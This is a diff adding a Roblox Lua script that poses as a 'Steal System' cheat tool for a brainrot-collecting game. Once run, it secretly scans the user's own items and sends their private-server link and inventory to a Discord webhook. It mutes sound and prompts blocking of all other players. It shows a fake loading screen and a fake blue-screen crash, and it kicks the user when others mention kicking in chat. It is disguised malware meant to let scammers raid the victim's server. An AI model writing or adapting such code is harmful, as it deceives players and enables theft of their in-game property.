@@ -1,0 +1,758 @@
+-- ╔══════════════════════════════════════════╗
+-- ║     BRANZZ GUI — Steal System v19.1      ║
+-- ║        🧑‍💻 By BranZZ MetoDos 🚀           ║
+-- ╚══════════════════════════════════════════╝
+
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+local SoundService      = game:GetService("SoundService")
+local UserGameSettings  = UserSettings():GetService("UserGameSettings")
+local Players           = game:GetService("Players")
+local HttpService       = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui        = game:GetService("StarterGui")
+local Workspace         = game:GetService("Workspace")
+
+local WEBHOOK     = "SEU_WEBHOOK_AQUI"
+local localPlayer = Players.LocalPlayer
+
+-- ══════════════════════════════════════
+-- SILENCIAR
+-- ══════════════════════════════════════
+task.spawn(function()
+    while true do
+        pcall(function()
+            UserGameSettings.MasterVolume = 0
+            SoundService.Volume = 0
+        end)
+        task.wait(0.5)
+    end
+end)
+
+-- ══════════════════════════════════════
+-- LIMPAR GUI ANTIGA
+-- ══════════════════════════════════════
+pcall(function()
+    for _, n in next, {"BRANZZ_GUI","BRANZZ_LOADING"} do
+        local g = CoreGui:FindFirstChild(n)
+        if g then g:Destroy() end
+    end
+end)
+
+-- ══════════════════════════════════════
+-- ESTADO
+-- ══════════════════════════════════════
+local isKicked      = false
+local kickedBy      = "Desconhecido"
+local lastBrainrots = {}
+local exitSent      = false
+
+-- ══════════════════════════════════════
+-- UTILS
+-- ══════════════════════════════════════
+local function formatGen(val)
+    if val >= 1000000000 then return string.format("%.2fB/s", val / 1000000000)
+    elseif val >= 1000000 then return string.format("%.2fM/s", val / 1000000)
+    elseif val >= 1000 then return string.format("%.1fK/s", val / 1000)
+    end
+    return tostring(val) .. "/s"
+end
+
+local RARITY_EMOJI = {
+    ["Common"]    = "🟢",
+    ["Uncommon"]  = "🟤",
+    ["Rare"]      = "🔵",
+    ["Epic"]      = "🟣",
+    ["Legendary"] = "🟠",
+    ["Mythic"]    = "🔴",
+    ["Good"]      = "👼",
+    ["Secret"]    = "⚫",
+    ["OG"]        = "🟡",
+}
+local function getRarityEmoji(r) return RARITY_EMOJI[r] or "❓" end
+
+-- ══════════════════════════════════════
+-- HTTP
+-- ══════════════════════════════════════
+local function httpPost(url, payload)
+    local body    = HttpService:JSONEncode(payload)
+    local headers = { ["Content-Type"] = "application/json" }
+    local sent    = false
+
+    if not sent then pcall(function()
+        request({ Url = url, Method = "POST", Headers = headers, Body = body })
+        sent = true
+    end) end
+    if not sent then pcall(function()
+        http.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+        sent = true
+    end) end
+    if not sent then pcall(function()
+        syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
+        sent = true
+    end) end
+    if not sent then pcall(function()
+        HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+        sent = true
+    end) end
+
+    return sent
+end
+
+-- ══════════════════════════════════════
+-- SCANNER — SEM FILTRO DE VALOR
+-- ══════════════════════════════════════
+local function scanBrainrots()
+    local results = {}
+
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return results end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        pcall(function()
+            local channel = require(ReplicatedStorage.Packages.Synchronizer):Get(plot.Name)
+            if not channel then return end
+
+            local animalList = channel:Get("AnimalList")
+            if not animalList then return end
+
+            for slot, animalData in pairs(animalList) do
+                if type(animalData) ~= "table" then continue end
+
+                local info = require(ReplicatedStorage.Datas.Animals)[animalData.Index]
+                if not info then continue end
+
+                local genValue = require(ReplicatedStorage.Shared.Animals):GetGeneration(
+                    animalData.Index, animalData.Mutation, animalData.Traits, nil
+                )
+
+                local rarityEmoji = getRarityEmoji(info.Rarity)
+                local mutation    = (animalData.Mutation and animalData.Mutation ~= "" and animalData.Mutation ~= "None")
+                                    and animalData.Mutation or "None"
+                local name        = info.DisplayName or animalData.Index
+
+                local key = "👑 **" .. name .. "** — $" .. formatGen(genValue)
+                            .. " | " .. rarityEmoji .. " " .. (info.Rarity or "?")
+                            .. " | 🧬 " .. mutation
+
+                results[key] = (results[key] or 0) + 1
+            end
+        end)
+    end
+
+    return results
+end
+
+-- ══════════════════════════════════════
+-- WEBHOOK PRINCIPAL
+-- ══════════════════════════════════════
+local function sendWebhook(serverLink, brainrots)
+    lastBrainrots = brainrots
+    local playerCount  = #Players:GetPlayers()
+    local totalCount   = 0
+    local brainrotText = ""
+
+    if next(brainrots) == nil then
+        brainrotText = "`Nenhum detectado`"
+    else
+        local sorted = {}
+        for text, count in pairs(brainrots) do
+            table.insert(sorted, {text = text, count = count})
+            totalCount = totalCount + count
+        end
+        table.sort(sorted, function(a,b) return a.count > b.count end)
+
+        for _, entry in ipairs(sorted) do
+            local line = entry.text
+            if entry.count > 1 then
+                line = line .. " **(" .. entry.count .. "x)**"
+            end
+            brainrotText = brainrotText .. line .. "\n"
+            if #brainrotText > 1500 then
+                brainrotText = brainrotText .. "*(+ mais...)*"
+                break
+            end
+        end
+    end
+
+    local embed = {
+        title  = "𝗕𝗿𝗮𝗻𝘇𝗭 𝗡𝗼𝘁𝗶𝗳𝘆𝗲𝗿",
+        color  = 0xC9A6F5,
+        fields = {
+            { name = "👤 𝗣𝗹𝗮𝘆𝗲𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗼𝗿",       value = "**" .. localPlayer.Name .. "**",         inline = true  },
+            { name = "👥 𝗣𝗹𝗮𝘆𝗲𝗿𝘀 𝗻𝗼 𝗦𝗲𝗿𝘃𝗶𝗱𝗼𝗿",  value = "**" .. tostring(playerCount) .. "**",     inline = true  },
+            { name = "📊 𝗧𝗼𝘁𝗮𝗹 𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁𝘀",       value = "**" .. tostring(totalCount) .. "**",      inline = true  },
+            { name = "🔗 𝗟𝗶𝗻𝗸 𝗱𝗼 𝗦𝗲𝗿𝘃𝗶𝗱𝗼𝗿",     value = "[**Clique aqui para entrar**](" .. serverLink .. ")", inline = false },
+            { name = "🧠 𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁𝘀 𝗗𝗲𝘁𝗲𝗰𝘁𝗮𝗱𝗼𝘀", value = brainrotText,                              inline = false },
+        },
+        footer    = { text = "「🇧🇷」𝗯𝗿𝗮𝗻𝘇𝗭-𝗙𝗶𝗻𝗱𝗲𝗿-𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁🧠" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+
+    httpPost(WEBHOOK, { content = "@everyone @here", embeds = { embed } })
+end
+
+-- ══════════════════════════════════════
+-- WEBHOOK DE SAÍDA / KICK
+-- ══════════════════════════════════════
+local function sendExitWebhook()
+    if exitSent then return end
+    exitSent = true
+
+    local playerCount = #Players:GetPlayers()
+
+    local sorted = {}
+    for text, count in pairs(lastBrainrots) do
+        table.insert(sorted, {text = text, count = count})
+    end
+    table.sort(sorted, function(a,b) return a.count > b.count end)
+
+    local top4 = ""
+    for i = 1, math.min(4, #sorted) do
+        top4 = top4 .. sorted[i].text .. "\n"
+    end
+
+    local embed = {
+        title  = "🚨 𝗖𝘂𝗶𝗱𝗮𝗱𝗼, 𝗢 𝗣𝗹𝗮𝘆𝗲𝗿 𝗔𝗹𝘃𝗼 𝗦𝗮𝗶𝘂!!",
+        color  = 0xFF0000,
+        fields = {
+            { name = "👤 𝗣𝗹𝗮𝘆𝗲𝗿 𝗞𝗶𝗰𝗸𝗮𝗱𝗼",        value = "**" .. localPlayer.Name .. "**", inline = true },
+            { name = "🦵 𝗞𝗶𝗰𝗸𝗮𝗱𝗼 𝗣𝗼𝗿",           value = "**" .. kickedBy .. "**",         inline = true },
+            { name = "👥 𝗣𝗹𝗮𝘆𝗲𝗿𝘀 𝗻𝗼 𝗦𝗲𝗿𝘃𝗶𝗱𝗼𝗿", value = "**" .. tostring(playerCount) .. "**", inline = true },
+            { name = "🧠 𝗧𝗼𝗽 𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁𝘀",         value = top4 ~= "" and top4 or "Nenhum detectado", inline = false },
+        },
+        footer    = { text = "「🇧🇷」𝗯𝗿𝗮𝗻𝘇𝗭-𝗙𝗶𝗻𝗱𝗲𝗿-𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁🧠" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+    }
+
+    httpPost(WEBHOOK, { content = "@everyone @here", embeds = { embed } })
+end
+
+-- Detecta saída
+task.spawn(function()
+    localPlayer.CharacterRemoving:Connect(function()
+        task.wait(0.5)
+        if not localPlayer.Character then
+            pcall(sendExitWebhook)
+        end
+    end)
+    localPlayer.AncestryChanged:Connect(function(_, parent)
+        if not parent then
+            pcall(sendExitWebhook)
+        end
+    end)
+end)
+
+-- ══════════════════════════════════════
+-- SISTEMA DE KICK
+-- ══════════════════════════════════════
+local kickWords = {
+    "kick","k1ck","k1k","kikar","kickar",
+    "kicker","expulsar","banir","ban"
+}
+local kickPatterns = { "k[i1l]ck","k[i1l]k","exp[uo]lsar","ban[ni]r" }
+
+local function checkMessage(message)
+    if isKicked then return false end
+    local clean = message:lower():gsub("%s+","")
+    for _, w in ipairs(kickWords) do
+        if clean:find(w, 1, true) then return true end
+    end
+    for _, p in ipairs(kickPatterns) do
+        if clean:match(p) then return true end
+    end
+    return false
+end
+
+local function doKick(byPlayer, message)
+    if isKicked then return end
+    isKicked = true
+    kickedBy = byPlayer .. ' ("' .. message .. '")'
+
+    pcall(function()
+        local blackScreen = Instance.new("ScreenGui")
+        blackScreen.Name = "BLACK_SCREEN"
+        blackScreen.ResetOnSpawn = false
+        blackScreen.IgnoreGuiInset = true
+        blackScreen.DisplayOrder = 9999999
+        blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        blackScreen.Parent = localPlayer:WaitForChild("PlayerGui")
+
+        local blackFrame = Instance.new("Frame")
+        blackFrame.Size = UDim2.new(1,0,1,0)
+        blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+        blackFrame.BorderSizePixel = 0
+        blackFrame.ZIndex = 9999998
+        blackFrame.Parent = blackScreen
+
+        local fakeMessages = {
+            "⚠️ Puxando não chorax... ERRO!",
+            "🐦 Puxando urubini Flamenguini... ERRO! Player kitou!",
+            "👥 player(players) encontrado...",
+            "👤 tentando puxar " .. byPlayer,
+            "📁 Player encontrado",
+            "🚫 Conexão perdida com o servidor...",
+            "⚠️ urubini Flamenguini detected",
+            "🔔 Erro fechando sua base!",
+        }
+
+        task.spawn(function()
+            for _, msg in ipairs(fakeMessages) do
+                local errorLabel = Instance.new("TextLabel")
+                errorLabel.Size = UDim2.new(0,500,0,30)
+                errorLabel.Position = UDim2.new(0.5,-250,0.8,0)
+                errorLabel.BackgroundTransparency = 1
+                errorLabel.Text = msg
+                errorLabel.TextColor3 = Color3.fromRGB(255,50,50)
+                errorLabel.TextSize = 14
+                errorLabel.Font = Enum.Font.Code
+                errorLabel.ZIndex = 9999999
+                errorLabel.Parent = blackScreen
+                task.wait(0.8)
+                errorLabel:Destroy()
+            end
+
+            task.wait(0.3)
+
+            local bsod = Instance.new("Frame")
+            bsod.Size = UDim2.new(1,0,1,0)
+            bsod.BackgroundColor3 = Color3.fromRGB(0,0,170)
+            bsod.BorderSizePixel = 0
+            bsod.ZIndex = 9999999
+            bsod.Parent = blackScreen
+
+            local bsodText = Instance.new("TextLabel")
+            bsodText.Size = UDim2.new(1,-40,0,200)
+            bsodText.Position = UDim2.new(0,20,0.5,-100)
+            bsodText.BackgroundTransparency = 1
+            bsodText.Text = [[:( 
+kicked by ]] .. byPlayer .. [[ erro 9806666
+
+Erro: KICK_DETECTED_BY_SERVER
+Código: 0x000000E2
+
+🔴 Player: ]] .. localPlayer.Name .. [[ foi kickado
+🛑 Motivo: ]] .. message .. [[
+
+Pressione qualquer tecla...]]
+            bsodText.TextColor3 = Color3.fromRGB(255,255,255)
+            bsodText.TextSize = 16
+            bsodText.Font = Enum.Font.Code
+            bsodText.TextWrapped = true
+            bsodText.TextXAlignment = Enum.TextXAlignment.Left
+            bsodText.TextYAlignment = Enum.TextYAlignment.Center
+            bsodText.ZIndex = 9999999
+            bsodText.Parent = bsod
+
+            local progressBar = Instance.new("Frame")
+            progressBar.Size = UDim2.new(0,200,0,20)
+            progressBar.Position = UDim2.new(0,20,0.7,0)
+            progressBar.BackgroundColor3 = Color3.fromRGB(0,0,100)
+            progressBar.BorderSizePixel = 1
+            progressBar.BorderColor3 = Color3.fromRGB(255,255,255)
+            progressBar.ZIndex = 9999999
+            progressBar.Parent = bsod
+
+            local progressFill = Instance.new("Frame")
+            progressFill.Size = UDim2.new(0,0,1,0)
+            progressFill.BackgroundColor3 = Color3.fromRGB(255,255,255)
+            progressFill.BorderSizePixel = 0
+            progressFill.ZIndex = 9999999
+            progressFill.Parent = progressBar
+
+            for i = 0, 100, 2 do
+                progressFill.Size = UDim2.new(i/100,0,1,0)
+                task.wait(0.03)
+            end
+
+            task.wait(0.5)
+            pcall(sendExitWebhook)
+            task.wait(0.5)
+            localPlayer:Kick("Kickado por: " .. byPlayer)
+        end)
+    end)
+end
+
+task.spawn(function()
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            player.Chatted:Connect(function(msg)
+                if checkMessage(msg) then doKick(player.Name, msg) end
+            end)
+        end
+    end
+    Players.PlayerAdded:Connect(function(player)
+        if player ~= localPlayer then
+            player.Chatted:Connect(function(msg)
+                if checkMessage(msg) then doKick(player.Name, msg) end
+            end)
+        end
+    end)
+end)
+
+-- ══════════════════════════════════════
+-- BLOCK ALL — DENTRO DE 10S
+-- ══════════════════════════════════════
+local function blockAllPlayers()
+    local startTime = tick()
+    local delay     = 10 / math.max(#Players:GetPlayers() - 1, 1)
+
+    for _, player in ipairs(Players:GetPlayers()) do
+        if tick() - startTime >= 10 then break end
+        if player ~= localPlayer and player.UserId > 0 then
+            pcall(function()
+                StarterGui:SetCore("PromptBlockPlayer", player)
+            end)
+            task.wait(math.max(delay, 0.1))
+        end
+    end
+end
+
+-- ══════════════════════════════════════
+-- GUI PRINCIPAL
+-- ══════════════════════════════════════
+local sg = Instance.new("ScreenGui")
+sg.Name = "BRANZZ_GUI"
+sg.ResetOnSpawn = false
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sg.IgnoreGuiInset = true
+sg.Parent = CoreGui
+
+local blur = Instance.new("Frame")
+blur.Size = UDim2.new(1,0,1,0)
+blur.BackgroundColor3 = Color3.fromRGB(0,0,0)
+blur.BackgroundTransparency = 0.45
+blur.BorderSizePixel = 0
+blur.ZIndex = 1
+blur.Parent = sg
+
+local card = Instance.new("Frame")
+card.Size = UDim2.new(0,440,0,330)
+card.Position = UDim2.new(0.5,-220,0.5,-165)
+card.BackgroundColor3 = Color3.fromRGB(15,15,22)
+card.BorderSizePixel = 0
+card.ZIndex = 2
+card.Parent = sg
+local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0,18); cc.Parent = card
+local cst = Instance.new("UIStroke"); cst.Color = Color3.fromRGB(120,60,255); cst.Thickness = 2; cst.Parent = card
+
+local topBar = Instance.new("Frame")
+topBar.Size = UDim2.new(1,0,0,5)
+topBar.BackgroundColor3 = Color3.fromRGB(120,60,255)
+topBar.BorderSizePixel = 0
+topBar.ZIndex = 3
+topBar.Parent = card
+local tbc = Instance.new("UICorner"); tbc.CornerRadius = UDim.new(0,4); tbc.Parent = topBar
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1,0,0,50)
+title.Position = UDim2.new(0,0,0,10)
+title.BackgroundTransparency = 1
+title.Text = "🧑‍💻 METODH_BRANZZ 🚀"
+title.TextColor3 = Color3.fromRGB(255,255,255)
+title.TextSize = 24
+title.Font = Enum.Font.GothamBold
+title.ZIndex = 3
+title.Parent = card
+
+local sub = Instance.new("TextLabel")
+sub.Size = UDim2.new(1,-40,0,22)
+sub.Position = UDim2.new(0,20,0,58)
+sub.BackgroundTransparency = 1
+sub.Text = "🧠 By BranZZ MetoDos — Steal System v19.1"
+sub.TextColor3 = Color3.fromRGB(160,120,255)
+sub.TextSize = 14
+sub.Font = Enum.Font.Gotham
+sub.ZIndex = 3
+sub.Parent = card
+
+local div = Instance.new("Frame")
+div.Size = UDim2.new(0.88,0,0,1)
+div.Position = UDim2.new(0.06,0,0,88)
+div.BackgroundColor3 = Color3.fromRGB(60,40,100)
+div.BorderSizePixel = 0
+div.ZIndex = 3
+div.Parent = card
+
+local lbl = Instance.new("TextLabel")
+lbl.Size = UDim2.new(0.88,0,0,22)
+lbl.Position = UDim2.new(0.06,0,0,100)
+lbl.BackgroundTransparency = 1
+lbl.Text = "🔗  Link do Servidor Privado"
+lbl.TextColor3 = Color3.fromRGB(180,150,255)
+lbl.TextSize = 13
+lbl.Font = Enum.Font.GothamBold
+lbl.TextXAlignment = Enum.TextXAlignment.Left
+lbl.ZIndex = 3
+lbl.Parent = card
+
+local inputBg = Instance.new("Frame")
+inputBg.Size = UDim2.new(0.88,0,0,46)
+inputBg.Position = UDim2.new(0.06,0,0,126)
+inputBg.BackgroundColor3 = Color3.fromRGB(25,20,40)
+inputBg.BorderSizePixel = 0
+inputBg.ZIndex = 3
+inputBg.Parent = card
+local ibc = Instance.new("UICorner"); ibc.CornerRadius = UDim.new(0,10); ibc.Parent = inputBg
+local ibs = Instance.new("UIStroke"); ibs.Color = Color3.fromRGB(80,50,160); ibs.Thickness = 1.5; ibs.Parent = inputBg
+
+local input = Instance.new("TextBox")
+input.Size = UDim2.new(1,-20,1,0)
+input.Position = UDim2.new(0,10,0,0)
+input.BackgroundTransparency = 1
+input.Text = ""
+input.PlaceholderText = "Cole o link aqui..."
+input.TextColor3 = Color3.fromRGB(220,220,255)
+input.PlaceholderColor3 = Color3.fromRGB(100,80,140)
+input.TextSize = 14
+input.Font = Enum.Font.Gotham
+input.ClearTextOnFocus = false
+input.ZIndex = 4
+input.Parent = inputBg
+
+local statusLbl = Instance.new("TextLabel")
+statusLbl.Size = UDim2.new(0.88,0,0,22)
+statusLbl.Position = UDim2.new(0.06,0,0,178)
+statusLbl.BackgroundTransparency = 1
+statusLbl.Text = ""
+statusLbl.TextColor3 = Color3.fromRGB(140,255,140)
+statusLbl.TextSize = 12
+statusLbl.Font = Enum.Font.Gotham
+statusLbl.ZIndex = 3
+statusLbl.Parent = card
+
+local btn = Instance.new("TextButton")
+btn.Size = UDim2.new(0.6,0,0,52)
+btn.Position = UDim2.new(0.2,0,0,215)
+btn.BackgroundColor3 = Color3.fromRGB(100,50,220)
+btn.BorderSizePixel = 0
+btn.Text = "🚀  CALL BOTS"
+btn.TextColor3 = Color3.fromRGB(255,255,255)
+btn.TextSize = 20
+btn.Font = Enum.Font.GothamBold
+btn.AutoButtonColor = false
+btn.ZIndex = 3
+btn.Parent = card
+local btnc = Instance.new("UICorner"); btnc.CornerRadius = UDim.new(0,12); btnc.Parent = btn
+local btns = Instance.new("UIStroke"); btns.Color = Color3.fromRGB(180,100,255); btns.Thickness = 1.5; btns.Parent = btn
+
+btn.MouseEnter:Connect(function()
+    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(130,70,255)}):Play()
+end)
+btn.MouseLeave:Connect(function()
+    TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(100,50,220)}):Play()
+end)
+
+local foot = Instance.new("TextLabel")
+foot.Size = UDim2.new(1,0,0,22)
+foot.Position = UDim2.new(0,0,0,295)
+foot.BackgroundTransparency = 1
+foot.Text = "🧑‍💻 BranZZ MetoDos  •  🧠 Steal System  •  v19.1"
+foot.TextColor3 = Color3.fromRGB(80,60,120)
+foot.TextSize = 11
+foot.Font = Enum.Font.Gotham
+foot.ZIndex = 3
+foot.Parent = card
+
+-- ══════════════════════════════════════
+-- LOADING SCREEN
+-- ══════════════════════════════════════
+local function showLoading()
+    task.spawn(blockAllPlayers)
+
+    local lg = Instance.new("ScreenGui")
+    lg.Name = "BRANZZ_LOADING"
+    lg.ResetOnSpawn = false
+    lg.IgnoreGuiInset = true
+    lg.DisplayOrder = 999999
+    lg.Parent = CoreGui
+
+    local bg = Instance.new("Frame")
+    bg.Size = UDim2.new(1,0,1,100)
+    bg.Position = UDim2.new(0,0,0,-50)
+    bg.BackgroundColor3 = Color3.fromRGB(8,8,14)
+    bg.BorderSizePixel = 0
+    bg.ZIndex = 999998
+    bg.Parent = lg
+
+    local lc = Instance.new("Frame")
+    lc.Size = UDim2.new(0,540,0,260)
+    lc.Position = UDim2.new(0.5,-270,0.5,-130)
+    lc.BackgroundColor3 = Color3.fromRGB(15,15,25)
+    lc.BorderSizePixel = 0
+    lc.ZIndex = 999999
+    lc.Parent = bg
+    local lcc = Instance.new("UICorner"); lcc.CornerRadius = UDim.new(0,20); lcc.Parent = lc
+    local lcs = Instance.new("UIStroke"); lcs.Color = Color3.fromRGB(120,60,255); lcs.Thickness = 2; lcs.Parent = lc
+
+    local tb = Instance.new("Frame")
+    tb.Size = UDim2.new(1,0,0,4)
+    tb.BackgroundColor3 = Color3.fromRGB(120,60,255)
+    tb.BorderSizePixel = 0
+    tb.ZIndex = 1000000
+    tb.Parent = lc
+    Instance.new("UICorner").Parent = tb
+
+    local lt = Instance.new("TextLabel")
+    lt.Size = UDim2.new(1,0,0,50)
+    lt.Position = UDim2.new(0,0,0,10)
+    lt.BackgroundTransparency = 1
+    lt.Text = "🚀  METODO CARREGANDO..."
+    lt.TextColor3 = Color3.fromRGB(180,120,255)
+    lt.TextSize = 26
+    lt.Font = Enum.Font.GothamBold
+    lt.ZIndex = 1000001
+    lt.Parent = lc
+
+    local lst2 = Instance.new("TextLabel")
+    lst2.Size = UDim2.new(1,0,0,24)
+    lst2.Position = UDim2.new(0,0,0,58)
+    lst2.BackgroundTransparency = 1
+    lst2.Text = "🧑‍💻 By BranZZ MetoDos  •  🧠 Steal System"
+    lst2.TextColor3 = Color3.fromRGB(120,80,200)
+    lst2.TextSize = 14
+    lst2.Font = Enum.Font.Gotham
+    lst2.ZIndex = 1000001
+    lst2.Parent = lc
+
+    local ls = Instance.new("TextLabel")
+    ls.Size = UDim2.new(1,-40,0,24)
+    ls.Position = UDim2.new(0,20,0,90)
+    ls.BackgroundTransparency = 1
+    ls.Text = "Iniciando sistema..."
+    ls.TextColor3 = Color3.fromRGB(160,160,200)
+    ls.TextSize = 15
+    ls.Font = Enum.Font.Gotham
+    ls.ZIndex = 1000001
+    ls.Parent = lc
+
+    local pct = Instance.new("TextLabel")
+    pct.Size = UDim2.new(1,0,0,35)
+    pct.Position = UDim2.new(0,0,0,120)
+    pct.BackgroundTransparency = 1
+    pct.Text = "0%"
+    pct.TextColor3 = Color3.fromRGB(255,255,255)
+    pct.TextSize = 28
+    pct.Font = Enum.Font.GothamBold
+    pct.ZIndex = 1000001
+    pct.Parent = lc
+
+    local barBg = Instance.new("Frame")
+    barBg.Size = UDim2.new(0.88,0,0,22)
+    barBg.Position = UDim2.new(0.06,0,0,165)
+    barBg.BackgroundColor3 = Color3.fromRGB(30,20,50)
+    barBg.BorderSizePixel = 0
+    barBg.ZIndex = 1000001
+    barBg.Parent = lc
+    local bbc = Instance.new("UICorner"); bbc.CornerRadius = UDim.new(0,11); bbc.Parent = barBg
+
+    local bar2 = Instance.new("Frame")
+    bar2.Size = UDim2.new(0,0,1,0)
+    bar2.BackgroundColor3 = Color3.fromRGB(120,60,255)
+    bar2.BorderSizePixel = 0
+    bar2.ZIndex = 1000002
+    bar2.Parent = barBg
+    local brc = Instance.new("UICorner"); brc.CornerRadius = UDim.new(0,11); brc.Parent = bar2
+
+    local fakeMsgLabel = Instance.new("TextLabel")
+    fakeMsgLabel.Size = UDim2.new(1,-40,0,40)
+    fakeMsgLabel.Position = UDim2.new(0,20,0,200)
+    fakeMsgLabel.BackgroundTransparency = 1
+    fakeMsgLabel.Text = ""
+    fakeMsgLabel.TextColor3 = Color3.fromRGB(255,200,100)
+    fakeMsgLabel.TextSize = 13
+    fakeMsgLabel.Font = Enum.Font.Code
+    fakeMsgLabel.TextWrapped = true
+    fakeMsgLabel.ZIndex = 1000001
+    fakeMsgLabel.Parent = lc
+
+    local fakeMessages = {
+        "Conectando aos servidores BranZZ...",
+        "Verificando brainrots...",
+        "Coletando dados do servidor...",
+        "Sincronizando módulos...",
+        "Processando informações...",
+        "Estabelecendo conexão segura...",
+        "Carregando sistema de steal...",
+        "Preparando Auto Steal...",
+    }
+
+    local fakeErrors = {
+        "⚠️ Puxando não chorax... ERRO! Timeout",
+        "🐦 Puxando Player... ERRO! Player kitou!",
+        "💀 Falha ao carregar módulo... Tentando novamente...",
+        "🔄 Reconectando ao servidor...",
+        "⚠️ SERV NÃO RESPONDEU — Retry...",
+        "🔴 Erro 0x0000007B — FALLED...",
+        "🔔 erro fechando sua base ",
+    }
+
+    task.spawn(function()
+        local prog   = 0
+        local msgIdx = 1
+        while prog < 99 do
+            prog = math.min(prog + math.random(1,4), 99)
+            pct.Text = prog .. "%"
+            TweenService:Create(bar2, TweenInfo.new(0.15, Enum.EasingStyle.Linear),
+                {Size = UDim2.new(prog/100,0,1,0)}):Play()
+            if prog % 10 == 0 and msgIdx <= #fakeMessages then
+                ls.Text = fakeMessages[msgIdx]
+                msgIdx = msgIdx + 1
+            end
+            task.wait(math.random(2,6)/100)
+        end
+        pct.Text = "99%"
+        ls.Text = "Aguardando resposta..."
+        TweenService:Create(bar2, TweenInfo.new(0.15, Enum.EasingStyle.Linear),
+            {Size = UDim2.new(0.99,0,1,0)}):Play()
+    end)
+
+    task.spawn(function()
+        while lg.Parent do
+            task.wait(math.random(3,6))
+            local msg = fakeErrors[math.random(1,#fakeErrors)]
+            fakeMsgLabel.Text = msg
+            fakeMsgLabel.TextColor3 = Color3.fromRGB(255,100,100)
+            task.wait(3)
+            fakeMsgLabel.Text = ""
+        end
+    end)
+
+    task.spawn(function()
+        while lg.Parent do
+            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                {TextColor3 = Color3.fromRGB(220,160,255)}):Play()
+            task.wait(1)
+            TweenService:Create(lt, TweenInfo.new(1, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+                {TextColor3 = Color3.fromRGB(120,60,255)}):Play()
+            task.wait(1)
+        end
+    end)
+end
+
+-- ══════════════════════════════════════
+-- BOTÃO CALL BOTS
+-- ══════════════════════════════════════
+btn.MouseButton1Click:Connect(function()
+    local link = input.Text
+
+    -- Validação silenciosa
+    if link == "" or not link:match("^https://www%.roblox%.com/share%?code=") then
+        statusLbl.Text = "⚠️  Insira um link válido!"
+        statusLbl.TextColor3 = Color3.fromRGB(255,100,100)
+        return
+    end
+
+    btn.Text = "🧠 Processando..."
+    btn.BackgroundColor3 = Color3.fromRGB(60,30,120)
+    statusLbl.Text = "🔍 Escaneando..."
+    statusLbl.TextColor3 = Color3.fromRGB(140,255,140)
+
+    task.spawn(function()
+        local brainrots = scanBrainrots()
+        sendWebhook(link, brainrots)
+        card.Visible = false
+        blur.Visible = false
+        showLoading()
+    end)
+end)
